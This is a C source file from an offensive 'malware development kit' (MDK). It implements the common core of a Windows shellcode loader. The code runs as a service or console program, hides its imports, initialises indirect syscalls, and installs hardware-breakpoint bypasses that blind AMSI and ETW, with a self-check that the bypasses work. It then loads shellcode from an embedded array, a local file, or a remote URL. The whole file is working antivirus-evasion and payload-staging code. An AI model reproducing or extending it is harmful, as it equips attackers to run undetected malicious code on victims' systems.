// MDK
// docs    : https://sebafvs.com/mdk/common
// author  : @sebafvs

#include <windows.h>

#include "mdk/dbg.h"
#include "mdk/result.h"
#include "mdk/syscalls.h"
#include "mdk/evasion.h"
#include "mdk/hwbp.h"
#include "mdk/amsi.h"
#include "mdk/etw.h"
#include "mdk/payload.h"
#include "mdk/staging.h"
#include "mdk/utils.h"
#include "mdk/nt.h"

#include "common.h"


typedef HRESULT (WINAPI *fn_amsi_scan_buffer)(HANDLE, PVOID, ULONG, LPCWSTR, HANDLE, PDWORD);
typedef ULONG   (WINAPI *fn_etw_event_write )(ULONGLONG, PVOID, ULONG, PVOID);


static const char*           g_shellcode_path    = NULL;
static mdk_loader_payload_fn g_payload_fn        = NULL;
static SERVICE_STATUS_HANDLE g_svc_status_handle = NULL;
static SERVICE_STATUS        g_svc_status        = { 0 };


static VOID WINAPI _svc_ctrl_handler(DWORD ctrl) {
    (void)ctrl;
}

static VOID WINAPI _svc_main(DWORD argc, LPWSTR *argv) {
    (void)argc; (void)argv;
    g_svc_status_handle = RegisterServiceCtrlHandlerW(L"", _svc_ctrl_handler);
    if (g_svc_status_handle) {
        g_svc_status.dwServiceType      = SERVICE_WIN32_OWN_PROCESS;
        g_svc_status.dwCurrentState     = SERVICE_RUNNING;
        g_svc_status.dwControlsAccepted = 0;
        SetServiceStatus(g_svc_status_handle, &g_svc_status);
    }
    if (g_payload_fn) { g_payload_fn(); }
}


int mdk_loader_start(IN int argc, IN char** argv, IN mdk_loader_payload_fn payload_fn) {
    if (argc >= 2 && argv[1] && argv[1][0]) { g_shellcode_path = argv[1]; }
    g_payload_fn = payload_fn;

    SERVICE_TABLE_ENTRYW svc_table[] = { { L"", _svc_main }, { NULL, NULL } };

    if (!StartServiceCtrlDispatcherW(svc_table)) {
        DBG_INFO("console mode (SCM dispatch not attached, gle=%lu)", GetLastError());
        if (g_shellcode_path) { DBG_INFO("shellcode path from argv[1]: %s", g_shellcode_path); }
        return payload_fn();
    }
    return 0;
}


const char* mdk_loader_shellcode_path(void) {
    return g_shellcode_path;
}


MDK_RESULT mdk_loader_setup_bypasses(void) {
    DBG_STAGE(1, "IAT camouflage");
    mdk_iat_camouflage();
    DBG_OK("mdk_iat_camouflage done");

    DBG_STAGE(2, "Init indirect syscalls");
    MDK_RESULT r = mdk_sc_init();
    if (MDK_FAIL(r)) {
        DBG_ERR("mdk_sc_init failed: op=%s nt=0x%08lX gle=%lu", r.operation, (unsigned long)r.nt_status, r.win32_error);
        return r;
    }
    DBG_OK("indirect syscall backend ready");

    DBG_STAGE(3, "Init HWBP library");
    r = mdk_hwbp_init();
    if (MDK_FAIL(r)) {
        DBG_ERR("mdk_hwbp_init failed: op=%s nt=0x%08lX gle=%lu", r.operation, (unsigned long)r.nt_status, r.win32_error);
        return r;
    }
    DBG_OK("HWBP library ready (VEH dispatcher registered)");

    DWORD tid = GetCurrentThreadId();

    DBG_STAGE(4, "Install AMSI bypass (DR0)");
    r = mdk_amsi_bypass_install(MDK_DR0, tid);
    if (MDK_FAIL(r)) {
        DBG_ERR("mdk_amsi_bypass_install failed: op=%s nt=0x%08lX gle=%lu", r.operation, (unsigned long)r.nt_status, r.win32_error);
        return r;
    }
    PVOID amsi_addr = NULL;
    mdk_amsi_scan_buffer_addr(&amsi_addr);
    DBG_OK("AMSI armed: fn=AmsiScanBuffer addr=%p slot=DR0 tid=%lu", amsi_addr, tid);

    DBG_STAGE(5, "Install ETW bypass (DR1)");
    r = mdk_etw_bypass_install(MDK_DR1, tid);
    if (MDK_FAIL(r)) {
        DBG_ERR("mdk_etw_bypass_install failed: op=%s nt=0x%08lX gle=%lu", r.operation, (unsigned long)r.nt_status, r.win32_error);
        return r;
    }
    PVOID etw_addr = NULL;
    mdk_etw_event_write_addr(&etw_addr);
    DBG_OK("ETW armed: fn=EtwEventWrite addr=%p slot=DR1 tid=%lu", etw_addr, tid);

    DBG_STAGE(6, "Sanity check bypasses");
    fn_amsi_scan_buffer amsi_scan_buffer = (fn_amsi_scan_buffer)amsi_addr;
    fn_etw_event_write  etw_event_write  = (fn_etw_event_write )etw_addr;

    DWORD   amsi_result = 0xBAADF00D;
    HRESULT amsi_hr     = amsi_scan_buffer(NULL, NULL, 0, NULL, NULL, &amsi_result);
    DBG_DETAIL("AMSI hr=0x%08lX out=0x%08lX hits=%ld", (unsigned long)amsi_hr, (unsigned long)amsi_result, mdk_amsi_bypass_hits());

    ULONG etw_ret = etw_event_write(0, NULL, 0, NULL);
    DBG_DETAIL("ETW  ret=0x%08lX hits=%ld", (unsigned long)etw_ret, mdk_etw_bypass_hits());

    if (amsi_hr == 0 && amsi_result == 0 && etw_ret == 0) {
        DBG_OK("both bypasses CONFIRMED");
    } else {
        DBG_ERR("bypass unverified");
    }

    return MDK_MAKE_OK();
}


void mdk_loader_cleanup_bypasses(void) {
    mdk_amsi_bypass_remove();
    mdk_etw_bypass_remove();
    mdk_hwbp_cleanup();
    mdk_sc_free();
}


MDK_RESULT mdk_loader_payload(IN const char* arg,
                              IN const BYTE* embedded, IN SIZE_T embedded_size,
                              OUT PBYTE* data, OUT SIZE_T* size) {
    // No argv: use the embedded array as-is.
    if (!arg || !arg[0]) {
        if (!embedded || !embedded_size) {
            return MDK_MAKE_FAIL("mdk_loader_payload:no_source", MDK_STATUS_NOT_FOUND);
        }
        PBYTE buffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, embedded_size);
        if (!buffer) { return MDK_MAKE_FAIL("HeapAlloc", MDK_STATUS_NO_MEMORY); }
        mdk_memcpy(buffer, embedded, embedded_size);
        *data = buffer;
        *size = embedded_size;
        return MDK_MAKE_OK();
    }

    // http:// or https:// prefix: remote fetch via WinINet.
    if (arg[0] == 'h' && arg[1] == 't' && arg[2] == 't' && arg[3] == 'p') {
        WCHAR url[2048];
        int   i;
        for (i = 0; i < 2047 && arg[i]; i++) { url[i] = (WCHAR)(unsigned char)arg[i]; }
        url[i] = L'\0';
        return mdk_fetch_payload(url, data, size);
    }

    // Otherwise: treat as a local file path.
    return mdk_read_file(arg, data, size);
}
